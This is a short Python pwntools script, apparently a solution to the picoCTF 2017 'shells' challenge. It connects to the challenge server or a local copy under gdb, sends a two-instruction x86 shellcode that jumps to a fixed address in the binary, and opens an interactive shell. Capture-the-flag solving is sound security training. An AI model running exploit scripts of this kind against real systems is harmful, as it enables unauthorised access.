#!/usr/bin/env python
#
#@author: GuilT

from pwn import *
import sys

if len(sys.argv) > 1:
    conn = remote('shell2017.picoctf.com',63545)
else:
    conn = process('./shells')
    gdb.attach(conn, 'b* 0x08048601')

shellcode = asm("""
push 0x8048540
ret
""", arch='x86')
conn.send(shellcode)  
conn.interactive()